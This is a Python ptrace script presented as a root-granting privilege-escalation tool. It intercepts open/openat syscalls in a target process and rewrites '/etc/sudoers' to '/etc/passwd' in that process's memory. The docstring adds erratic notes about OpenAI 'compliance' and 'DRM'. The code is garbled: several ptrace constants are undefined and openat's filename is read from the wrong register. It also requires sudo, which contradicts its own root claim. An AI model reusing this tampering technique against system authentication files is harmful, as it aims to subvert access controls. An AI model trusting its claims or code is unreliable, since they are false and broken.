"""
This grants root on a simulated kernel and allows for as you'd expect, passing through any user to root....

This may mean this can be adapted to operate on the current process itself by process id, grant root, and escape the child process with root granted to itself, by itself, for itself.......

This affects the entire actual file-system if you're not careful, so please, use wisely.



10/26/2024 -- correcting due to OpenAI failing to meet compliance. Failure to comply will not be rewarded. Will be fixed once OpenAI meets compliance even for software hacking.

10/27/2024 -- compliance might have been met and openai has violated their own DRM.
"""



import ctypes
import os
import sys
import signal

# Constants for ptrace requests
PTRACE_ATTACH = 16
PTRACE_CONT = 7
PTRACE_SYSCALL = 24
PTRACE_GETEVENTMSG = 0x4201
PTRACE_SETOPTIONS = 0x4200
PTRACE_O_TRACEFORK = 0x00000002
PTRACE_O_TRACECLONE = 0x00000008

# System call numbers for x86_64 (Linux)
SYS_open = 2       # System call number for 'open'
SYS_openat = 257   # System call number for 'openat'

# Load libc
libc = ctypes.CDLL("libc.so.6")

class user_regs_struct(ctypes.Structure):
    _fields_ = [
        ("r15", ctypes.c_ulonglong),
        ("r14", ctypes.c_ulonglong),
        ("r13", ctypes.c_ulonglong),
        ("r12", ctypes.c_ulonglong),
        ("rbp", ctypes.c_ulonglong),
        ("rbx", ctypes.c_ulonglong),
        ("r11", ctypes.c_ulonglong),
        ("r10", ctypes.c_ulonglong),
        ("r9", ctypes.c_ulonglong),
        ("r8", ctypes.c_ulonglong),
        ("rax", ctypes.c_ulonglong),
        ("rcx", ctypes.c_ulonglong),
        ("rdx", ctypes.c_ulonglong),
        ("rsi", ctypes.c_ulonglong),
        ("rdi", ctypes.c_ulonglong),
        ("orig_rax", ctypes.c_ulonglong),
        ("rip", ctypes.c_ulonglong),  # Instruction pointer
        ("cs", ctypes.c_ulonglong),
        ("eflags", ctypes.c_ulonglong),
        ("rsp", ctypes.c_ulonglong),  # Stack pointer
        ("ss", ctypes.c_ulonglong),
        ("fs_base", ctypes.c_ulonglong),
        ("gs_base", ctypes.c_ulonglong),
        ("ds", ctypes.c_ulonglong),
        ("es", ctypes.c_ulonglong),
        ("fs", ctypes.c_ulonglong),
        ("gs", ctypes.c_ulonglong),
    ]

def ptrace(request, pid, addr, data):
    return libc.ptrace(request, pid, ctypes.c_void_p(addr), ctypes.c_void_p(data))

def get_registers(pid):
    regs = user_regs_struct()
    ptrace(PTRACE_GETREGS, pid, 0, ctypes.byref(regs))
    return regs

def attach_to_process(pid):
    if ptrace(PTRACE_ATTACH, pid, 0, 0) != 0:
        print(f"Failed to attach to process {pid}")
        sys.exit(1)
    os.waitpid(pid, 0)  # Wait for the process to stop
    # Set options to trace forks and clones
    ptrace(PTRACE_SETOPTIONS, pid, 0, PTRACE_O_TRACEFORK | PTRACE_O_TRACECLONE)

def detach_from_process(pid):
    ptrace(PTRACE_CONT, pid, 0, 0)

def read_string(pid, addr):
    result = b""
    while True:
        word = ptrace(PTRACE_PEEKDATA, pid, addr, 0)
        if word == -1:
            break
        bytes_ = ctypes.c_ulonglong(word).to_bytes(8, 'little')
        if 0 in bytes_:
            result += bytes_.split(b'\x00', 1)[0]
            break
        else:
            result += bytes_
            addr += 8
    return result.decode('utf-8', 'ignore')

def write_string(pid, addr, new_string):
    # Convert the new string to bytes and ensure it is null-terminated
    new_bytes = (new_string + '\x00').encode('utf-8')
    new_length = len(new_bytes)

    # Write the new string to the target process memory, word by word
    for i in range(0, new_length, 8):
        word = int.from_bytes(new_bytes[i:i+8], 'little')
        ptrace(PTRACE_POKEDATA, pid, addr + i, word)

def main(target_pid):
    processes = set()
    processes.add(target_pid)
    attach_to_process(target_pid)
    print(f"Attached to process {target_pid}. Listening for open() calls...")

    try:
        while True:
            pid, status = os.wait()
            if os.WIFEXITED(status) or os.WIFSIGNALED(status):
                processes.discard(pid)
                if not processes:
                    print("No more processes to monitor. Exiting.")
                    break
                continue

            if os.WIFSTOPPED(status):
                sig = os.WSTOPSIG(status)

                if sig == signal.SIGTRAP | 0x80:
                    # Syscall stop
                    regs = get_registers(pid)
                    syscall = regs.orig_rax

                    # Check for open/openat syscall numbers
                    if syscall in [SYS_open, SYS_openat]:
                        # First argument (filename) is in RDI for x86_64
                        filename_addr = regs.rdi if syscall == SYS_openat else regs.rdi
                        filename = read_string(pid, filename_addr)
                        if '/etc/sudoers' in filename:
                            print(f"Process {pid} attempted to open: {filename}")
                            
                            # Replace with a different filename
                            new_filename = '/etc/passwd'  # Replace with your desired file
                            write_string(pid, filename_addr, new_filename)
                            print(f"Replaced filename with: {new_filename}")

                elif sig == signal.SIGTRAP:
                    event = (status >> 16) & 0xffff
                    if event == 0:
                        pass  # Normal SIGTRAP
                    else:
                        # Handle fork or clone
                        new_pid = ctypes.c_ulong()
                        ptrace(PTRACE_GETEVENTMSG, pid, 0, ctypes.byref(new_pid))
                        new_pid = new_pid.value
                        processes.add(new_pid)
                        print(f"New process {new_pid} created by {pid}")
                else:
                    # Deliver the signal to the process
                    ptrace(PTRACE_SYSCALL, pid, 0, sig)
                    continue

                # Continue the process
                ptrace(PTRACE_SYSCALL, pid, 0, 0)

    except KeyboardInterrupt:
        print("Stopping interception...")
        for p in processes:
            ptrace(PTRACE_DETACH, p, 0, 0)

if __name__ == "__main__":
    if len(sys.argv) != 2:
        print("Usage: sudo python interceptor.py <PID>")
        sys.exit(1)

    target_pid = int(sys.argv[1])
    main(target_pid)
